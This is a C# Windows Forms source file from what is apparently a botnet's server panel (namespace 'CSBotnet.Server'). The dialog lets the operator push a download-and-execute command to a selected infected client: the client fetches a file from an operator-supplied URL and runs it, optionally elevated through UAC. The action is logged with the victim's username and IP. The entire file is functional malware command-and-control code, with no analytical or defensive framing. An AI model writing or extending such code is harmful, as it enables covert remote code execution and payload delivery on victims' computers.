using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CSBotnet.Server
{
    public partial class DlExeWin : Form
    {
        Client client;

        public DlExeWin()
        {
            InitializeComponent();
            client = DashboardUtils.GetSelectedClient();
        }

        private void DlExeWin_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string? FileUrl = FileUrlEntry.Text.Trim();
            string? FileName = FileNameEntry.Text.Trim();
            string? FileArgs = FileArgsEntry.Text.Trim();
            string? FileExtension = FileExtensionCombobox.Text.Trim();
            string RunMode = FileExecutionModeCombobox.Text.Trim();

            if (string.IsNullOrEmpty(FileUrl) || string.IsNullOrEmpty(FileName) || string.IsNullOrEmpty(FileExtension) || string.IsNullOrEmpty(RunMode))
            {
                MsgBox.Warning("Missing datas", "Please fill all the fields");
                return;
            }

            if (string.IsNullOrEmpty(FileArgs))
            {
                FileArgs = "<NoArgs>";
            }

            string runAs = "false";

            if (RunMode == "Run as Administrator (UAC)")
            {
                runAs = "true";
            }

            try
            {
                Network.SendString(client.Stream, $"<DlExe>{FileUrl};{FileName}.{FileExtension};{runAs};{FileArgs}");
                Logger.Info($"Executing file {FileName}.{FileExtension} on {client.Username}@{client.Ip}");
                this.Close();
            }
            catch (Exception ex)
            {
                Logger.Error($"An error occured while sending the run file command to the client {client.Username}@{client.Ip} : \n\n" + ex.Message);
                MsgBox.Error("Coudln't send the command", "An error occured while sending the command to the client : \n\n" + ex.Message);  
            }
        }
    }
}
